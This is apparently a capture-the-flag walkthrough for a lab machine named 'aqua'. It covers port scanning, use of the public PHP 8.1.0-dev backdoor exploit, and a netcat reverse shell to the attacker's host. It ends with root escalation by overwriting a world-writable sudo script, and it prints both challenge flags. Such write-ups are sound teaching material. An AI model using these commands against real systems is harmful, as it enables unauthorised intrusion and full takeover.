# 🖥 Walkthrough | aqua

## 1. Reconnaissance

To identify possible attack vectors, the first step is to scan the host for open ports. This can be done by using `nmap`. The parameter `-p-` instructs nmap to scan all 65535 ports:

```bash
# nmap -A -p- 192.168.60.3
[..]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 b7:a1:63:7e:11:df:24:9f:13:9e:85:b2:ac:f4:ab:47 (RSA)
|   256 7e:c2:cc:27:30:5a:5a:c9:20:96:c0:aa:3b:c8:64:1f (ECDSA)
|_  256 ab:c7:78:52:73:f4:80:7a:75:18:92:20:19:67:0e:9c (ED25519)
80/tcp open  http    Apache httpd (PHP 8.1.0-dev)
|_http-title: AQUA Design Studios
|_http-server-header: Apache
[..]
```

The output suggests that there are two open ports: an SSH and an HTTP server. The Apache HTTP server on port 80 appears to host a static website, which can be viewed in any web browser:

![website](img/01.png)

## 2. Exploitation / Remote code execution

The next step is to exploit vulnerabilities in the exposed services. The first option that comes to mind is the PHP version `8.1.0-dev` which was identified by the `nmap` scan.

A quick lookup with `searchsploit` shows an interesting exploit:

```bash
# searchsploit -t 8.1.0-dev      
---------------------------------------------------------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution       | php/webapps/49933.py
---------------------------------------------------------------------------------
```

This remote code execution vulnerability has been introduced by malicious actors in 2021: [PHP 8.1.0-dev - "User-Agentt Remote Code Execution"](https://www.exploit-db.com/exploits/49933)

We can examine the exploit script via `searchsploit -x php/webapps/49933.py`. Let's run it and see if it works:

```bash
# python3 /usr/share/exploitdb/exploits/php/webapps/49933.py
Enter the full host url:
http://192.168.60.3/

Interactive shell is opened on http://192.168.60.3/ 
Can't acces tty; job crontol turned off.
$ id 
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Cool! Looks like we can execute commands on the machine. The next step is to establish a reverse shell for an interactive experience. We can use this [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

Establishing the reverse shell happens in two steps:

1. Start a listener on your local Kali Linux machine on some port:  `nc -lnvp 4242`

2. Connect to the listener from `aqua` by using the Python exploit script from above and then executing:
   ```bash
   $ nc -e /bin/bash 192.168.60.2 4242
   ```
   > Note that you need to provide the IP address of your Kali machine, which is `192.168.60.2`.

As soon as the command in step 2 is executed, the listener from step 1 will show an incoming connection from `aqua`. You can now type shell commands that will be executed on the remote machine.

For a more convenient experience, it is recommended to upgrade the connection to an [interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). To do this, simply execute `python3 -c 'import pty; pty.spawn("/bin/bash")'`:

```bash
$ nc -lnvp 4242
listening on [any] 4242 ..connect to [192.168.60.2] from (UNKNOWN) [192.168.60.3] 57206
python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@aqua:/$ 
```

Now, there is a shell prompt and we can clearly see that we are logged in as the `daemon` user.

Now we can explore the file system with a couple of `ls` and `cd` commands to locate the first flag:

```bash
daemon@aqua:/$ ls -al /home/aqua                                                    
total 24                                                             
drwxr-xr-x 2 aqua aqua 4096 Jun 25 11:35 .                           
drwxr-xr-x 4 root root 4096 Jun 25 11:35 ..                          
-rw-r--r-- 1 aqua aqua  220 Aug  4  2021 .bash_logout                
-rw-r--r-- 1 aqua aqua 3526 Aug  4  2021 .bashrc                     
-rw-r--r-- 1 aqua aqua  807 Aug  4  2021 .profile                    
-rw-r--r-- 1 aqua aqua   69 Jun 25 11:35 token                      
daemon@aqua:/$ cat /home/aqua/token                                               
Hello there! This one is for you: AQUA{r3m0te_b4ckd00rz_ar3_aw3s0me} 
```

## 3. Privilege escalation

The next step is to escalate privileges to root to completely take control of the machine.

One of the first attempts should be to try if we can execute commands as root via `sudo`:

```bash
daemon@aqua:/$ sudo -l                                                                                          
Matching Defaults entries for daemon on aqua:                                                        
    env_reset, mail_badpass,                                                                         
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                    

User daemon may run the following commands on aqua:
    (root) NOPASSWD: /opt/restart-apache
```

It appears that the daemon user can run the script `/opt/restart-apache` as root without a password. That sounds nice, let's have a look at the file:

```bash
daemon@aqua:/$ cat /opt/restart-apache
#!/bin/bash

# Sometimes Apache just stops working...
# This script simply restarts the web server.

echo "Restarting Apache. This might take a moment..."
systemctl restart apache2.service
echo "Done!"
```

Apparently, the script simply restarts the Apache web server. Investigating the file permissions with `ls` shows that ANYONE can modify this file:

```bash
daemon@aqua:/$ ls -al /opt/restart-apache
-rwxrwxrwx 1 root root 202 Jun 25 11:39 /opt/restart-apache
```

Well, that's... weird? And insecure!

So let's override the file with another script that just runs the `bash` command:

```bash
daemon@aqua:/$ printf '#!/bin/bash\nbash' > /opt/restart-apache
```

Running this script via sudo should drop us into an interactive root shell:

```bash
daemon@aqua:/$ sudo /opt/restart-apache
root@aqua:/# id
uid=0(root) gid=0(root) groups=0(root)
root@aqua:/# cat /root/token
Nice job! Looks like you deserve this token: AQUA{w0rld_wr1t4ble_f1l3z_c4n_be_h3lpful}
```

Looks like we found our second token! Challenge completed!
